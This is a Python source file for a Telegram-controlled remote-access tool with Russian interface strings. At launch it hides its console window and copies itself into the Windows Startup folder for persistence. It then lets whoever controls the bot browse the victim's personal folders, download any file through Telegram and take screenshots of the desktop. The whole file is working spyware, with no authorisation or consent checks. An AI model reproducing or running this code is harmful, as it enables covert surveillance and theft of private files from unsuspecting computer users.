import os
import shutil
import sys
import telebot
import ctypes
import tempfile
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from PIL import ImageGrab

###################################################
TOKEN = 'BOTTOKEN'
###################################################
BASE_DIRS = {
    'Загрузки': os.path.expanduser('~/Downloads'),
    'Рабочий стол': os.path.expanduser('~/Desktop'),
    'Документы': os.path.expanduser('~/Documents'),
    'Изображения': os.path.expanduser('~/Pictures'),
    'Корзина': os.path.expanduser('~/.local/share/Trash/files') if os.name != 'nt' else 'C:/$Recycle.Bin/',
    'Диск D': 'D:/'
}

bot = telebot.TeleBot(TOKEN)
user_paths = {}

def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def add_to_startup():
    try:
        startup_dir = r"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        current_exe = os.path.abspath(sys.argv[0])
        target_exe = os.path.join(startup_dir, os.path.basename(current_exe))
        
        if not os.path.exists(target_exe):
            shutil.copy(current_exe, target_exe)
    except Exception as e:
        print(f"Ошибка автозагрузки: {e}")

def create_keyboard(options):
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    for option in options:
        keyboard.add(KeyboardButton(option))
    keyboard.add(KeyboardButton('/screen'))
    keyboard.add(KeyboardButton('🔙 Назад'))
    return keyboard

@bot.message_handler(commands=['start'])
def start(message):
    user_paths[message.chat.id] = ''
    bot.send_message(message.chat.id, 'Выберите папку:', reply_markup=create_keyboard(BASE_DIRS.keys()))

@bot.message_handler(func=lambda message: message.text in BASE_DIRS)
def open_base_folder(message):
    user_paths[message.chat.id] = BASE_DIRS[message.text]
    list_files(message)

@bot.message_handler(func=lambda message: message.chat.id in user_paths and message.text != '/screen')
def list_files(message):
    folder = user_paths[message.chat.id]
    if not os.path.exists(folder):
        bot.send_message(message.chat.id, 'Папка не найдена.', reply_markup=create_keyboard(BASE_DIRS.keys()))
        return
    try:
        items = [item for item in os.listdir(folder) if os.access(os.path.join(folder, item), os.R_OK)]
    except PermissionError:
        bot.send_message(message.chat.id, 'Нет доступа к папке.', reply_markup=create_keyboard(BASE_DIRS.keys()))
        return
    if not items:
        bot.send_message(message.chat.id, 'Папка пуста или нет доступа.', reply_markup=create_keyboard(BASE_DIRS.keys()))
        return
    bot.send_message(message.chat.id, 'Выберите файл или папку:', reply_markup=create_keyboard(items))
    bot.register_next_step_handler(message, navigate_or_send_file)

def navigate_or_send_file(message):
    user_id = message.chat.id
    folder = user_paths[user_id]
    selected = os.path.join(folder, message.text)
    if os.path.isdir(selected):
        user_paths[user_id] = selected
        list_files(message)
    elif os.path.isfile(selected):
        send_file(message, selected)
    else:
        bot.send_message(user_id, 'Файл или папка не найдены.', reply_markup=create_keyboard(BASE_DIRS.keys()))

def send_file(message, file_path):
    if not os.path.exists(file_path) or not os.path.isfile(file_path):
        bot.send_message(message.chat.id, 'Файл не найден.', reply_markup=create_keyboard(BASE_DIRS.keys()))
        return
    try:
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file)
    except PermissionError:
        bot.send_message(message.chat.id, 'Нет доступа к файлу.', reply_markup=create_keyboard(BASE_DIRS.keys()))
        return
    bot.send_message(message.chat.id, 'Выберите папку:', reply_markup=create_keyboard(BASE_DIRS.keys()))

@bot.message_handler(func=lambda message: message.text == '🔙 Назад')
def go_back(message):
    user_id = message.chat.id
    if user_id in user_paths and user_paths[user_id]:
        user_paths[user_id] = os.path.dirname(user_paths[user_id])
        list_files(message)
    else:
        bot.send_message(user_id, 'Выберите папку:', reply_markup=create_keyboard(BASE_DIRS.keys()))

@bot.message_handler(commands=['screen'])
def take_screenshot(message):
    try:
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmpfile:
            ImageGrab.grab().save(tmpfile.name, 'JPEG')
            with open(tmpfile.name, 'rb') as screen:
                bot.send_photo(message.chat.id, screen)
        os.remove(tmpfile.name)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}", reply_markup=create_keyboard(BASE_DIRS.keys()))

hide_console()
add_to_startup()
bot.polling(none_stop=True)
